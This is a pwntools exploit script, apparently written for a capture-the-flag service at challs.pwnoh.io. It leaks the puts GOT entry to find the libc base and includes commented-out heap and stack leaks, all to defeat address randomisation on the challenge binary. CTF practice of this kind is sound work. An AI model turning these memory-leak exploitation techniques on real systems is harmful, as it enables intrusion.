#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["alacritty", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")



SERVICE = "challs.pwnoh.io"
PORT = 13375

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def get_leak(p,e,target):
    sl(p,str(target))
    ru(p,b"Good choice! We gathered ")
    leak = int(rl(p).split(b" ")[0])
    log.info(f"Leaked {hex(leak)}")
    return leak


def answer(p,e,answer):
    ru(p,b"Where in the world is") 
    sl(p,str(answer))


def exploit(p,e,l):
    # Leak got entry for puts
    got_puts = get_leak(p,e,e.got["puts"])
    l.address = got_puts - l.sym["puts"]
    log.info(f"Leaked libc address {hex(l.address)}")

    # main_arena+96 
    #heap_leak = (get_leak(p,e,l.sym["main_arena"]+92) >> 32) - 0x3a0 
    #log.info(f"Leaked heap adddress {hex(heap_leak)}")

     
    # Leak stack from __libc_environ
    #stack = get_leak(p,e,l.sym["environ"])

    sl(p,str(0))
    sleep(5)

    # Base
    answer(p,e,e.address)

    #answer(p,e,heap_leak)

    #answer(p,e,l.address)

    p.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc.so.6")

    exploit(p,e,l)
